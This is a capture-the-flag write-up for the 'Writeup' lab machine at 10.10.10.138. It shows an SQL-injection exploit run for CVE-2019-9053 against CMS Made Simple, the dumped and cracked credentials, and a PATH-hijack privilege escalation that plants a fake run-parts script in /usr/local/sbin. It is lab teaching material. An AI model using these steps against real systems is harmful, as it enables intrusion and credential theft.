Writeup - 10.10.10.138


First things first fire up nmap see what is going on....

Instantly see activity on port 80 so lets head over and see what
kind of webapp is running in the writeup directory. 

http://10.10.10.138/writeup/ - dir to start

After scanning we see writeup and using wappalyzer a builtin tool in our firefox. Just
search for the plugin for you version of firefox. Other ways to identify but found its 
running CMSimple. We then search for any exploits and find a CVE-2019-9053 vulnerability
so we try our exploit -

python another1.py -u http://10.10.10.138/writeup/

Salt for password found: 5a599ef579066807n[+] Username found: jkrn[+] Email found: jkr@writeup.htbn[+] Password found: 62def4866937f08cc13bab43bb14e6f7

I seen other ways but anyone who looks for the path for the least resistance for
bloods was able to crack it in 5 seconds on MD5crackstation.

Creds so far 

62def4866937f08cc13bab43bb14e6f7 : 5a599ef579066807 - raykayjay9

username - jkr
password - raykayjay9

We now login and find ourselves our first flag and begin to right
away dig around to privlage escalate.

jkr@writeup:~$ ls

jkr@writeup:~$ cat user.txt

jkr@writeup:~$


Now after digging around I found this running as users login to the
box if you notice it is running a script as root to update the message
of the day. 

2019/07/05 20:34:34 CMD: UID=0    PID=8421   | run-parts --lsbsysinit /etc/update-motd.d 
2019/07/05 20:34:34 CMD: UID=0    PID=8422   | /bin/sh /etc/update-motd.d/10-uname

So we look around and see that run-parts script is coming from the /bin
directory so if we can write for example further up the line we can inject
our own run-parts and exploit the root flag that way. 

So that is exactly what we do and you can get yourself a shell or just copy the password either
way it will lead to privlage escalation. 

jkr@writeup:/usr/sbin$ echo "cat /root/root.txt" > /usr/local/sbin/run-parts
jkr@writeup:/usr/sbin$ chmod +x /usr/local/sbin/run-parts

So as we can see I jumped up the line and was able to write in the /usr/local/sbin/ directory allowing
us to place our script ahead of the path PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin as you can see /bin is at the end of the line in the env variable. 

After loggin back in to test our exploit we got the root flag printed right
on the login motd so now we have root!

root:/:# ssh jkr@10.10.10.138
jkr@10.10.10.138's password: 
eeba47f60b48ef92b7************** (Root Flag!!)

So now we have pwned both flags and rooted writeup.
